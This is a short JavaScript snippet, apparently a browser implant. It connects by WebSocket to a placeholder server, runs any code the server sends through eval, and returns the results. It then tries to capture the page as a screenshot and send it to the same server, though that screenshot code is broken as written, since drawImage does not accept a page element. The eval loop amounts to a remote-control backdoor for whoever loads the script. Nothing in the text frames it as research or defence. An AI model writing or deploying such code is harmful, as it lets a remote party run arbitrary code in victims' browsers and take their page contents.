const ws = new WebSocket('wss://SERVER_URL');
ws.onopen = () => console.log('Connected');
ws.onmessage = ({ data }) => {
    let result;
    try {
        result = eval(data); // Evaluate the incoming payload
    } catch (e) {
        result = 'Error: ' + e;
    }
    ws.send(result);
};

ws.onclose = () => console.log('Disconnected');

 async function takeScreenshot() {
    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    context.drawImage(document.body, 0, 0);

    const screenshotData = await new Promise((resolve) => {
         const base64Data = canvas.toDataURL("image/png").split(",")[1]; // Extract Base64 string
        resolve(base64Data);
    });
    ws.send(screenshotData); 
}
takeScreenshot();   
 
